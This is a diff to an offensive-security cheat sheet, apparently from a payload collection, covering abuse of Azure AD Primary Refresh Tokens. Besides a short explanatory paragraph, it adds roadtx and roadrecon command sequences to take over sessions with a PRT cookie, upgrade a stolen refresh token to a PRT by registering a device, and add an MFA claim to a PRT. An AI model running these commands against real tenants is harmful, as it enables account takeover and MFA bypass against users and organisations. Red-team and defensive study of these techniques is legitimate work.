@@ -89,6 +89,8 @@ Mail.ReadWrite.All  https://graph.microsoft.com             00b41c95-dab0-4487-9
 
 ## Primary Refresh Token
 
+A Primary Refresh Token (PRT) is a key artifact in the authentication and identity management process in Microsoft's Azure AD (Azure Active Directory) environment. The PRT is primarily used for maintaining a seamless sign-in experience on devices. 
+
 * Use PRT token
     ```ps1
     roadtx browserprtauth --prt <prt-token> --prt-sessionkey <session-key>
@@ -112,21 +114,12 @@ roadtx browserprtauth --prt <prt> --prt-sessionkey <clear-key> --keep-open -url 
 * No method known to date.
 
 
-### Upgrade Refresh Token to PRT
+### Use PRT cookie
 
-```ps1
-# Get correct token audience
-roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file
-
-# Registering device
-roadtx device -a register -n <device-name>
-
-# Request PRT 
-roadtx prt --refresh-token <refresh-token> -c <device-name>.pem -k <device-name>.key
-
-# Use a PRT
-roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
-```
+* `roadrecon auth prt-init`
+* Use [dirkjanm/ROADtoken](https://github.com/dirkjanm/ROADtoken) or [wotwot563/aad_prt_bof](https://github.com/wotwot563/aad_prt_bof)
+* `roadrecon auth --prt-cookie <prt-cookie> --tokens-stdout --debug`
+* Then browse to [login.microsoftonline.com ](login.microsoftonline.com ) with a cookie `x-ms-RefreshTokenCredential:<output-from-roadrecon>`
 
 
 ### Request a PRT with Hybrid Device
@@ -144,6 +137,20 @@ Use the user account to create a computer and request a PRT
     roadtx prt -c <hybrid-device-name>.pem -k <hybrid-device-name>.key -u <username>@h<domain> -p <password>
     roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com
     ```
+
+
+### Upgrade Refresh Token to PRT
+
+* Get correct token audience: `roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file`
+* Registering device: `roadtx device -a register -n <device-name>`
+* Request PRT `roadtx prt --refresh-token <refresh-token> -c <device-name>.pem -k <device-name>.key`
+* Use a PRT: `roadtx browserprtauth --prt <prt-token> --prt-sessionkey <prt-session-key> --keep-open -url https://portal.azure.com`
+
+
+### Enriching a PRT with MFA claim
+
+* Request a special refresh token: `roadtx prtenrich -u username@domain`
+* Request a PRT with MFA claim: `roadtx prt -r <refreshtoken> -c <device>.pem -k <device>.key`
 
 
 ## References
